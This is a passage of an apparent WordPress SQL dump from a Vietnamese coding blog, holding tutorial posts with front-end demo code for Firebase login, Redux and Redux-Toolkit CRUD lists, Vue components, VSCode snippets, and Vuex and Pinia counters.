// Just Login\r\n                document.getElementById(\'auth-info\').innerHTML = `\r\n                            <img src=\"${user.providerData[0].photoURL}\"></img>\r\n                            <div>Xin chào: ${user.providerData[0].displayName}</div>\r\n                            <div>UID: ${user.uid}</div>\r\n                            <div>Social: ${user.providerData[0].providerId}</div>\r\n                            <div><button onclick=\"signout()\">Sign out</button></div>\r\n                            <p>${JSON.stringify(user, null, 4)}</p>\r\n                        `;\r\n            } else {\r\n                // Not Login\r\n                document.getElementById(\'auth-info\').innerHTML = \"\"\r\n                ui.start(\'#firebaseui-auth-container\', uiConfig);\r\n            }\r\n        });\r\n\r\n        // 2. Login UI\r\n        let uiConfig = {\r\n            callbacks: {\r\n                signInSuccessWithAuthResult: function (authResult, redirectUrl) {\r\n                    return false;\r\n                },\r\n                uiShown: function () {\r\n                    // 2.1. Finish load Firebase CSS\r\n                    document.getElementById(\'loader\').style.display = \'none\';\r\n                }\r\n            },\r\n            // 2.2. Signin page: popup\r\n            signInFlow: \'popup\',\r\n            signInOptions: [\r\n                {\r\n                    provider: firebase.auth.PhoneAuthProvider.PROVIDER_ID,\r\n                    recaptchaParameters: {\r\n                        type: \'image\',\r\n                        size: \'normal\',\r\n                        badge: \'bottomleft\'\r\n                    },\r\n                    defaultCountry: \'VN\',\r\n                },\r\n                firebase.auth.GoogleAuthProvider.PROVIDER_ID,\r\n                firebase.auth.FacebookAuthProvider.PROVIDER_ID,\r\n            ],\r\n            tosUrl: \'/link-terms-of-service\',\r\n            privacyPolicyUrl: \'/link-privacy-policy\'\r\n        };\r\n\r\n        let signout = () => {\r\n            firebase.auth().signOut()\r\n                .then(() => {\r\n                    console.log(\"You are sign out\");\r\n                })\r\n                .catch((error) => {\r\n                    console.log(\"SignOut faild\");\r\n                });\r\n        }\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n', 'Firebase Authentication with Facebook and Google use HTTPs', '', 'publish', 'open', 'open', '', 'firebase-authentication-with-facebook-and-google-use-https', '', '', '2022-11-08 09:23:21', '2022-11-08 09:23:21', '', 0, 'https://duycode.com/?p=1583', 0, 'post', '', 0),
(1600, 1, '2021-06-29 04:00:40', '2021-06-28 21:00:40', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"\" />\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n    <style>\n        table {\n            border-collapse: collapse;\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js\"></script>\n    <!-- =========== src/utils.js =========== -->\n    <script>\n        class Uuid {\n            s4() {\n                return Math.floor((1 + Math.random()) * 0x10000)\n                    .toString(16)\n                    .substring(1);\n            }\n            s16() {\n                return this.s4() + this.s4() + this.s4() + this.s4();\n            }\n        }\n        let uuid = new Uuid();\n    </script>\n\n    <!-- =========== slices/listStudent_slice.js =========== -->\n    <script>\n        //Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn\n        let listStudent_local = JSON.parse(localStorage.getItem(\'listStudent\')) || { data: [], loading: false };\n        const listStudent_slice = RTK.createSlice({\n            name: \'listStudent\',\n            initialState: listStudent_local,\n            reducers: {\n                action_saveStudent(state, action) {\n                    if (!action.payload.id) {\n                        let new_student = {\n                            id: uuid.s16(),\n                            username: action.payload.username,\n                            email: action.payload.email,\n                        };\n                        state.data.push(new_student);\n\n                    } else {\n                        let find_student = state.data.find((item) => item.id == action.payload.id);\n                        find_student.username = action.payload.username;\n                        find_student.email = action.payload.email;\n                    }\n                    localStorage.setItem(\'listStudent\', JSON.stringify(state));\n                    return state;\n                },\n                action_deleteStudent(state, action) {\n                    state.data = state.data.filter((item) => item.id != action.payload);\n                    localStorage.setItem(\'listStudent\', JSON.stringify(state));\n                    return state;\n                },\n                action_setListStudent(state, action) {\n                    state.data = action.payload.map(item => ({\n                        username: item.username,\n                        email: item.email,\n                        id: item.id,\n                    }))\n                    state.loading = false;\n                    localStorage.setItem(\'listStudent\', JSON.stringify(state));\n                    return state;\n                },\n                action_getListStudentsOnline(state, action) {\n                    state.loading = true;\n                    return state;\n                }\n            }\n        });\n        // export ra các actions, reducer tương ứng :D\n        const { action_saveStudent, action_deleteStudent, action_setListStudent, action_getListStudentsOnline } = listStudent_slice.actions;\n        const listStudent_reducer = listStudent_slice.reducer;\n    </script>\n\n    <!-- =========== src/api/studentAPI =========== -->\n    <script type=\"text/babel\">\n        //API cần để riêng 1 file\n        const getStudentsFake = (url) => async (dispatch) => {\n            dispatch(action_getListStudentsOnline());\n            let response = await fetch(url);\n            let responseJSON = await response.json();\n            dispatch(action_setListStudent(responseJSON));\n        }\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        //Khai báo tất cả các Reducer trong store ở dưới đây\n        //ReduxToolkit đã cài đặt sẵn middlewareThunk và Redux devtools extension rồi, ko cần cài đặt gì thêm nữa\n        const store = RTK.configureStore({\n            reducer: {\n                listStudent: listStudent_reducer,\n                //product: product_reducer,\n            }\n        })\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function App(props) {\n            //Sử dụng useSelector và useSelector của useDispatch sẽ tiện hơn rất nhiều so với phải dùng HOC\n            const listStudent = ReactRedux.useSelector(state => state.listStudent);\n            const dispatch = ReactRedux.useDispatch();\n            const dispatch_saveStudent = (student) => dispatch(action_saveStudent(student));\n            const dispatch_deleteStudent = (id) => dispatch(action_deleteStudent(id));\n            const dispatch_getStudentsFake = (url) => dispatch(getStudentsFake(url));\n\n            const [url_fakeStudent, setUrl_fakeStudent] = React.useState(\'https://jsonplaceholder.typicode.com/users\')\n            const [filterName, setFilterName] = React.useState(\'\');\n            const [student, setStudent] = React.useState({ username: \'\', email: \'\', id: \'\' });\n\n            const updateState_student = (e) => {\n                let newStudent = { ...student };\n                newStudent[e.target.name] = e.target.value;\n                setStudent(newStudent)\n            };\n\n            const onSaveStudent = (e) => {\n                if (!student.username || !student.email) return;\n                dispatch_saveStudent(student);\n                setStudent({ username: \'\', email: \'\', id: \'\' });\n            };\n\n            return (\n                <div>\n                    <button onClick={() => { setStudent({ username: \'\', email: \'\', id: \'\' }) }}>New Student</button> <br />\n                    <input type=\"text\" placeholder=\"username\" name=\"username\"\n                        value={student.username}\n                        onChange={updateState_student}\n                    /> <br />\n                    <input\n                        type=\"text\" placeholder=\"email\" name=\"email\"\n                        value={student.email}\n                        onChange={updateState_student}\n                    /> <br />\n                    <button onClick={onSaveStudent}>\n                        {student.id ? \'Update Student\' : \'Add Student\'}\n                    </button> <br /> <br />\n                    <input type=\"text\" placeholder=\"Search ...\" name=\"txtFilterName\"\n                        value={filterName}\n                        onChange={(e) => { setFilterName(e.target.value) }}\n                    />\n                    <table>\n                        <thead>\n                            <tr>\n                                <th>#</th>\n                                <th>Username</th>\n                                <th>Email</th>\n                                <th>Action</th>\n                            </tr>\n                        </thead>\n                        <tbody>\n                            {\n                                listStudent.data\n                                    .filter((item) => item.username.includes(filterName))\n                                    .map((item, index) => {\n                                        return (\n                                            <tr key={item.id}>\n                                                <td>{index}</td>\n                                                <td>{item.username}</td>\n                                                <td>{item.email}</td>\n                                                <td>\n                                                    <button onClick={(e) => { setStudent({ ...item }) }}>Sửa</button>\n                                                    <button onClick={(e) => { dispatch_deleteStudent(item.id) }}>Xóa</button>\n                                                </td>\n                                            </tr>\n                                        );\n                                    })\n                            }\n                        </tbody>\n                    </table>\n                    <select value={url_fakeStudent} onChange={(e) => { setUrl_fakeStudent(e.target.value) }}>\n                        <option value=\"https://jsonplaceholder.typicode.com/users\">https://jsonplaceholder.typicode.com/users</option>\n                        <option value=\"https://fakestoreapi.com/users?limit=10\">https://fakestoreapi.com/users?limit=10</option>\n                    </select><br />\n                    <button onClick={e => { dispatch_getStudentsFake(url_fakeStudent) }}>Get Student Fake</button> \n                    {listStudent.loading && <img src=\"https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif\" width=\"14px\" />}\n                </div>\n            );\n\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-CRUD: 4. ListStudent with Redux-Toolkit', '', 'publish', 'open', 'open', '', 'demo-crud-4-liststudent-with-redux-toolkit', '', '', '2021-06-29 04:00:40', '2021-06-28 21:00:40', '', 0, 'https://duycode.com/?p=1600', 0, 'post', '', 0),
(1603, 1, '2021-06-29 03:00:54', '2021-06-28 20:00:54', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"\" />\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n    <style>\n        table {\n            border-collapse: collapse;\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux-thunk/2.3.0/redux-thunk.js\"></script>\n    <!-- =========== src/utils.js =========== -->\n    <script>\n        class Uuid {\n            s4() {\n                return Math.floor((1 + Math.random()) * 0x10000)\n                    .toString(16)\n                    .substring(1);\n            }\n            s16() {\n                return this.s4() + this.s4() + this.s4() + this.s4();\n            }\n        }\n        let uuid = new Uuid();\n    </script>\n\n\n    <!-- =========== constants/ActionTypes.js =========== -->\n    <script>\n        //Các hằng số types ==> sử dụng cho các actions\n        const types = {\n            SAVE_STUDENT: \'SAVE_STUDENT\',\n            DELETE_STUDENT: \'DELETE_STUDENT\',\n            SET_LIST_STUDENT: \'SET_LIST_STUDENT\',\n        };\n    </script>\n\n    <!-- =========== reducers/listStudent_reducer.js =========== -->\n    <script>\n        //Trong 1 Reducer bao gồm 2 thành phần: state và reducer\n        //State là nơi chứa dữ liệu\n        //Reducer là nơi xử lý các action (khi bị dispatch)\n        //---- listStudent_state có thể khởi tạo mặc định hoặc lấy trên localStorage\n        let listStudent_state = JSON.parse(localStorage.getItem(\'listStudent\')) || [];\n        let listStudent_reducer = (state = listStudent_state, action) => {\n            //Khi làm việc với state, cần return ra 1 state mới, \n            //Tốt nhất nên copystate cũ luôn\n            let new_state = [...state]\n            switch (action.type) {\n                case types.SAVE_STUDENT:\n                    if (!action.payload.id) {\n                        let new_student = {\n                            id: uuid.s16(),\n                            username: action.payload.username,\n                            email: action.payload.email,\n                        };\n                        new_state.push(new_student);\n                    } else {\n                        let find_student = new_state.find((item) => item.id == action.payload.id);\n                        find_student.username = action.payload.username;\n                        find_student.email = action.payload.email;\n                    }\n                    localStorage.setItem(\'listStudent\', JSON.stringify(new_state));\n                    return new_state;\n\n                case types.DELETE_STUDENT:\n                    new_state = state.filter((item) => item.id != action.payload);\n                    localStorage.setItem(\'listStudent\', JSON.stringify(new_state));\n                    return new_state;\n\n                case types.SET_LIST_STUDENT:\n                    localStorage.setItem(\'listStudent\', JSON.stringify(action.payload));\n                    return action.payload;\n            }\n            return new_state;\n        };\n    </script>\n\n    <!-- =========== reducers/listproduct_Reducer.js =========== -->\n\n    <!-- =========== reducers/index.js =========== -->\n    <script>\n        //Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất\n        let rootReducer = Redux.combineReducers({\n            listStudent: listStudent_reducer,\n            //product: productReducer,\n        });\n    </script>\n\n    <!-- =========== actions/index.js =========== -->\n    <script>\n        //Các action khi được dispatch ==> sẽ trả về object actions tương ứng\n        let action_saveStudent = (student) => ({\n            type: types.SAVE_STUDENT,\n            payload: student,\n        });\n        let action_deleteStudent = (id) => ({\n            type: types.DELETE_STUDENT,\n            payload: id,\n        });\n        let action_setListStudent = (list) => ({\n            type: types.SET_LIST_STUDENT,\n            payload: list,\n        })\n\n        // Trường hợp action là 1 function get api (không trả về 1 object nữa)\n        // ==> Giải quyết bằng cách dùng middleware ==> Từ action này lại dispatch 1 action khác \n        let action_getStudentsOnline = () => async (dispatch) => {\n            let url = \'https://fakestoreapi.com/users?limit=10\';\n            let response = await fetch(url);\n            let responseJSON = await response.json();\n            dispatch(action_setListStudent(responseJSON));\n        };\n    </script>\n\n    <!-- =========== middleware/list_middleware.js =========== -->\n    <script>\n        //Middleware là việc kiểm tra và xử lý các action trước ==> convert các action đúng ý mình trước đã, rồi mới cho đi tiếp\n        const checkSymbolMiddleware = store => next => action => {\n            //console.log(store, next, action, store.getState());\n            if (action.type == types.SAVE_STUDENT && action.payload.username.includes(\"fuck\")) {\n                action.payload.username = action.payload.username.replaceAll(\"fuck\", \"****\")\n            }\n            //next: tương đương với \"dispatch\" ==> next(action) tương đương dispatch(action)==>nghĩa là chạy bình thường\n            return next(action);\n        }\n\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        // Cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions\n        const composeEnhancers =\n            typeof window === \'object\' &&\n                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ?\n                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__({\n                    // Specify extension’s options like name, actionsBlacklist, actionsCreators, serialize...\n                }) : Redux.compose;\n\n        // Ném các middleware vào trong Redux.applyMiddleware()\n        // Khi dùng ReduxThunk làm middleware, các action là dạng function sẽ được ReduxThunk xử lý trước, nên không cần check choác như trước nữa\n        const store = Redux.createStore(\n            rootReducer /* preloadedState, */,\n            composeEnhancers(Redux.applyMiddleware(ReduxThunk.default, checkSymbolMiddleware))\n        );\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function App(props) {\n            //Sử dụng useSelector và useSelector của useDispatch sẽ tiện hơn rất nhiều so với phải dùng HOC\n            const listStudent = ReactRedux.useSelector(state => state.listStudent);\n            const dispatch = ReactRedux.useDispatch();\n            const dispatch_saveStudent = (student) => dispatch(action_saveStudent(student));\n            const dispatch_deleteStudent = (id) => dispatch(action_deleteStudent(id));\n            const dispatch_getStudentsOnline = () => dispatch(action_getStudentsOnline());\n\n            const [filterName, setFilterName] = React.useState(\'\');\n            const [student, setStudent] = React.useState({ username: \'\', email: \'\', id: \'\' });\n\n            const updateState_student = (e) => {\n                let newStudent = { ...student };\n                newStudent[e.target.name] = e.target.value;\n                setStudent(newStudent)\n            };\n\n            const onSaveStudent = (e) => {\n                if (!student.username || !student.email) return;\n                dispatch_saveStudent(student);\n                setStudent({ username: \'\', email: \'\', id: \'\' });\n            };\n\n            return (\n                <div>\n                    <button onClick={() => { setStudent({ username: \'\', email: \'\', id: \'\' }) }}>New Student</button> <br />\n                    <input type=\"text\" placeholder=\"username\" name=\"username\"\n                        value={student.username}\n                        onChange={updateState_student}\n                    /> <br />\n                    <input\n                        type=\"text\" placeholder=\"email\" name=\"email\"\n                        value={student.email}\n                        onChange={updateState_student}\n                    /> <br />\n                    <button onClick={onSaveStudent}>\n                        {student.id ? \'Update Student\' : \'Add Student\'}\n                    </button> <br /> <br />\n                    <input type=\"text\" placeholder=\"Search ...\" name=\"txtFilterName\"\n                        value={filterName}\n                        onChange={(e) => { setFilterName(e.target.value) }}\n                    />\n                    <table>\n                        <thead>\n                            <tr>\n                                <th>#</th>\n                                <th>Username</th>\n                                <th>Email</th>\n                                <th>Action</th>\n                            </tr>\n                        </thead>\n                        <tbody>\n                            {\n                                listStudent\n                                    .filter((item) => item.username.includes(filterName))\n                                    .map((item, index) => {\n                                        return (\n                                            <tr key={item.id}>\n                                                <td>{index}</td>\n                                                <td>{item.username}</td>\n                                                <td>{item.email}</td>\n                                                <td>\n                                                    <button onClick={(e) => { setStudent({ ...item }) }}>Sửa</button>\n                                                    <button onClick={(e) => { dispatch_deleteStudent(item.id) }}>Xóa</button>\n                                                </td>\n                                            </tr>\n                                        );\n                                    })\n                            }\n                        </tbody>\n                    </table>\n                    <button onClick={e => { dispatch_getStudentsOnline() }}>Get Student Online</button>\n                </div>\n            );\n\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-CRUD: 3. ListStudent, use Redux-Thunk', '', 'publish', 'open', 'open', '', 'demo-crud-3-liststudent-use-redux-thunk', '', '', '2021-06-29 03:00:54', '2021-06-28 20:00:54', '', 0, 'https://duycode.com/?p=1603', 0, 'post', '', 0),
(1621, 1, '2021-07-29 21:45:31', '0000-00-00 00:00:00', '<h2>\n\n</h2>', 'VUEJS - Khởi tạo Vue và Component', '', 'draft', 'open', 'open', '', '', '', '', '2021-07-29 21:45:31', '0000-00-00 00:00:00', '', 0, 'https://duycode.com/?p=1621', 0, 'post', '', 0),
(1622, 1, '2021-07-15 01:00:22', '2021-07-14 18:00:22', '<h2>1. VueJS 2: Khởi tạo Vue và Component</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<body>\r\n    <div id=\"app1\">1. Vue2 mount by \"el\"</div>\r\n    <div id=\"app2\">2. Vue2 mount by \"$mount\"</div>\r\n    <div id=\"app3\">3. Dữ liệu sẽ bị thay thế</div>\r\n\r\n    <div id=\"app4\">\r\n        <component1></component1>\r\n        <component2></component2>\r\n    </div>\r\n    <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\r\n    <script>\r\n        //1. Có 2 cách Vue mount vào element: dùng \"el\" hoặc dùng \"$mount\"\r\n        let app1 = new Vue({\r\n            el: \"#app1\",\r\n        });\r\n        let app2 = new Vue({\r\n        }).$mount(\"#app2\");\r\n\r\n        //2. Khi dùng \"template\" Vue sẽ replace hoàn toàn dữ liệu của element có id được chỉ định\r\n        let app3 = new Vue({\r\n            template: `<p>3. Vue2 use template</p>`\r\n        }).$mount(\"#app3\");\r\n\r\n        //3. Khai báo component dạng global\r\n        Vue.component(\"component1\", {\r\n            template: \"<div>This is component 1</div>\"\r\n        });\r\n\r\n        //4. Khai báo component dạng local\r\n        let app4 = new Vue({\r\n            el: \"#app4\",\r\n            components: {\r\n                component2: {\r\n                    template: \"<div>This is component 2</div>\"\r\n                }\r\n            }\r\n        });\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'VueJS - 1. Khởi tạo Vue và Component', '', 'publish', 'open', 'open', '', 'vuejs-1-khoi-tao-vue-va-component', '', '', '2022-11-12 05:08:53', '2022-11-12 05:08:53', '', 0, 'https://duycode.com/?p=1622', 0, 'post', '', 0),
(1628, 1, '2021-01-01 02:00:48', '2020-12-31 19:00:48', '*** Tạo snippets mới cho VSCode\n-- Vào File >> Preferences >> User snippets >> New Global snippets file ...\n<h2>1. Snippets for HTML5\n<pre>\n{\n  \"Create <table></table>\": {\n    \"scope\": \"html\",\n    \"prefix\": \"table\",\n    \"body\": [\n      \"<table>\",\n      \"\\t<thead>\",\n      \"\\t\\t<tr>\",\n      \"\\t\\t\\t<th>#</th>\",\n      \"\\t\\t\\t<th>$0</th>\",\n      \"\\t\\t</tr>\",\n      \"\\t</thead>\",\n      \"\\t<tbody>\",\n      \"\\t\\t<tr>\",\n      \"\\t\\t\\t<td></td>\",\n      \"\\t\\t</tr>\",\n      \"\\t</tbody>\",\n      \"</table>\"\n    ],\n    \"description\": \"Create <table></table>\"\n  }\n}\n\n</pre>\n\n<h2>2. Snippets for Javascripts </h2>\n<pre>\n{\n  \"$(\'element\').\": {\n    \"scope\": \"javascript\",\n    \"prefix\": \"$\",\n    \"body\": [\"$(\'$1\').$0\"],\n    \"description\": \"Use const $\"\n  },\n\n  \"const $ = document.querySelector.bind(document)\": {\n    \"scope\": \"javascript,html\",\n    \"prefix\": \"$\",\n    \"body\": [\"const $ = document.querySelector.bind(document);\", \"$0\"],\n    \"description\": \"Create const $\"\n  }\n}\n</pre>\n\n<h2>3. Snippets for VueJS </h2>\n<pre>\n{\n	\"Default Vue\": {\n		\"scope\": \"vue\",\n		\"prefix\": [\"vue\", \"cvue\"],\n		\"body\": [\n			\"<template>\",\n			\"\\t<div>\",\n			\"\\t\\t$0\",\n			\"\\t</div>\",\n			\"</template>\",\n			\"\",\n			\"<script>\",\n			\"export default {\",\n			\"\\tdata() {\",\n			\"\\t\\treturn {\",\n			\"\\t\\t\\t\",\n			\"\\t\\t}\",\n			\"\\t},\",\n			\"\",\n			\"\\tmethods: {\",\n			\"\\t\\t\",\n			\"\\t},\",\n			\"}\",\n			\"</script>\",\n			\"\",\n			\"<style scoped>\",\n			\"\\t\",\n			\"</style>\"\n		],\n		\"description\": \"Demo file Vue \"\n	}\n}\n</pre>', 'VSCode - 2. Snippets', '', 'publish', 'open', 'open', '', 'vscode-2-snippets', '', '', '2021-01-01 02:00:48', '2020-12-31 19:00:48', '', 0, 'https://duycode.com/?p=1628', 0, 'post', '', 0),
(1631, 1, '2022-11-01 01:00:56', '2022-11-01 01:00:56', '<img src=\"https://vuex.vuejs.org/vuex.png\" alt=\"\" />\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Vuex for Vue</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <input id=\"ipAmount\" type=\"number\" value=\"1\">\r\n    <button id=\"btnIncrement\">Increment</button>\r\n    <button id=\"btnDecrement\">Decrement</button>\r\n    <p id=\"txtCount\"></p>\r\n\r\n    <!-- <script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script> -->\r\n    <!-- <script src=\"https://unpkg.com/vuex@4/dist/vuex.global.js\"></script> -->\r\n    <script src=\"https://unpkg.com/vue@3.2.41/dist/vue.global.js\"></script>\r\n    <script src=\"https://unpkg.com/vuex@4.1.0/dist/vuex.global.js\"></script>\r\n\r\n    <script>\r\n        const $ = document.querySelector.bind(document);\r\n\r\n        //1. Tạo store Vuex\r\n        const store = Vuex.createStore({\r\n            state() {\r\n                return {\r\n                    count: 0,\r\n                }\r\n            },\r\n            //3. Action nhận dispatch, xử lý payload rồi commit mutations\r\n            actions: {\r\n                increment(context, payload) {\r\n                    context.commit(\'increment\', payload);\r\n                },\r\n                decrement(context, payload) {\r\n                    context.commit(\'decrement\', payload);\r\n                }\r\n            },\r\n\r\n            //Chỉ có thể thay đổi giá trị của state tại mutations\r\n            mutations: {\r\n                increment(state, payload) {\r\n                    state.count += payload.amount;\r\n                },\r\n                decrement(state, payload) {\r\n                    state.count -= payload.amount;\r\n                },\r\n            },\r\n\r\n            //Getters có thể nhận 1 biến, hoặc 1 function đều được\r\n            getters: {\r\n                countFix: state => custom => {\r\n                    return state.count.toFixed(custom)\r\n                }\r\n            }\r\n        })\r\n\r\n        // 2. Dispatch Action ==> có 2 cách viết, dispatch cả object kèm type, hoặc tách rời\r\n        $(\'#btnIncrement\').onclick = () => {\r\n            let n = Number($(\'#ipAmount\').value)\r\n            //store.dispatch(\'increment\', { amount: n })\r\n            store.dispatch({\r\n                type: \'increment\',\r\n                amount: n,\r\n            })\r\n        }\r\n\r\n        $(\'#btnDecrement\').onclick = () => {\r\n            let n = Number($(\'#ipAmount\').value)\r\n            store.dispatch(\'decrement\', { amount: n })\r\n        }\r\n\r\n        // Render lần đầu\r\n        $(\'#txtCount\').innerText = store.getters.countFix(3);\r\n\r\n        //5. Subscribe state khi state thay đổi\r\n        store.subscribe((mutation, state) => {\r\n            //console.log(mutation, state);\r\n            $(\'#txtCount\').innerText = store.getters.countFix(3);\r\n        })\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'Vuex - Count: Without Component', '', 'publish', 'open', 'open', '', 'vuex-count-without-component', '', '', '2022-11-03 07:23:32', '2022-11-03 07:23:32', '', 0, 'https://duycode.com/?p=1631', 0, 'post', '', 0),
(1634, 1, '2022-10-02 01:00:42', '2022-10-02 01:00:42', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Vuex for Vue</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\">\r\n        <input type=\"number\" v-model.number=\"amount\">\r\n        <button v-on:click=\"increment\">Increment</button>\r\n        <button v-on:click=\"decrement\">Decrement</button>\r\n        <p>{{ store.countFix(3) }}</p>\r\n    </div>\r\n\r\n    <script src=\"https://unpkg.com/vue@3.2.41/dist/vue.global.js\"></script>\r\n    <script src=\"https://unpkg.com/vue-demi@0.13.11/lib/index.iife.js\"></script>\r\n    <script src=\"https://unpkg.com/pinia@2.0.23/dist/pinia.iife.js\"></script>\r\n\r\n    <script>\r\n        const useCounterStore = Pinia.defineStore(\'counter\', {\r\n            state: () => ({ count: 0 }),\r\n            actions: {\r\n                increment(x) {\r\n                    this.count += x\r\n                },\r\n                decrement(x) {\r\n                    this.count -= x\r\n                }\r\n            },\r\n            getters: {\r\n                countFix: (state) => (custom) => state.count.toFixed(custom)\r\n            }\r\n        })\r\n\r\n        const RootComponent = {\r\n            setup() {\r\n                const store = useCounterStore()\r\n                return {\r\n                    amount: 1,\r\n                    store,\r\n                }\r\n            },\r\n            methods: {\r\n                increment() {\r\n                    // this.store.increment(this.amount)\r\n                    // this.store.count += this.amount\r\n                    this.store.$patch({ count: this.store.count + this.amount })\r\n                },\r\n                decrement() {\r\n                    this.store.decrement(this.amount)\r\n                }\r\n            },\r\n        }\r\n\r\n        const pinia = Pinia.createPinia()\r\n        const app = Vue.createApp(RootComponent)\r\n        app.use(pinia)\r\n        app.mount(\"#app\")\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'Pinia - Count: Simple Component', '', 'publish', 'open', 'open', '', 'pinia-count-simple-component', '', '', '2022-11-04 08:18:30', '2022-11-04 08:18:30', '', 0, 'https://duycode.com/?p=1634', 0, 'post', '', 0),
(1640, 1, '2022-11-01 02:00:20', '2022-11-01 02:00:20', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Vuex for Vue</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\">\r\n        <input type=\"number\" v-model.number=\"amount\">\r\n        <button v-on:click=\"increment\">Increment</button>\r\n        <button v-on:click=\"decrement\">Decrement</button>\r\n        <p>{{count}}</p>\r\n    </div>\r\n\r\n    <script src=\"https://unpkg.com/vue@3.2.19/dist/vue.global.js\"></script>\r\n    <script src=\"https://unpkg.com/vuex@4.0.2/dist/vuex.global.js\"></script>\r\n\r\n    <script>\r\n        //A. Tạo store Vuex\r\n        const store = Vuex.createStore({\r\n            //3. State là kho chứa dữ liệu\r\n            state() {\r\n                return {\r\n                    count: 0,\r\n                }\r\n            },\r\n            //1. Action nhận dispatch, xử lý payload rồi commit mutations\r\n            actions: {\r\n                increment(context, payload) {\r\n                    context.commit(\'increment\', payload);\r\n                },\r\n                decrement(context, payload) {\r\n                    context.commit(\'decrement\', payload);\r\n                }\r\n            },\r\n\r\n            //2. Chỉ có thể thay đổi giá trị của State tại mutations\r\n            mutations: {\r\n                increment(state, payload) {\r\n                    state.count += payload.amount;\r\n                },\r\n                decrement(state, payload) {\r\n                    state.count -= payload.amount;\r\n                },\r\n            },\r\n\r\n            //4. Getters có thể nhận 1 biến, hoặc 1 function đều được\r\n            getters: {\r\n                countFix: state => custom => {\r\n                    return state.count.toFixed(custom)\r\n                }\r\n            }\r\n        })\r\n\r\n        //B. Tạo Root Component\r\n        